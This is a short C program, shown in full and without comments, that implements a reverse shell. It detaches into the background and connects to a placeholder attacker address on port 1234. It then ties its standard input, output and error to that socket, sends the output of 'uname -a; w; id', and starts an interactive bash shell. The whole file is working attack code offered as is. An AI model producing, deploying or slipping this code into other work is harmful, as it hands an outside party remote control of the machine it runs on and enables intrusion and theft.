#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
	daemon(1, 0);
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in serv_addr = {0};
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(1234);
	serv_addr.sin_addr.s_addr = inet_addr("x.x.x.x");
	if(0 != connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)))
		_exit(0);
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);
	system("uname -a; w; id");
	execl("/bin/bash", "/bin/bash", "-i", NULL);
}
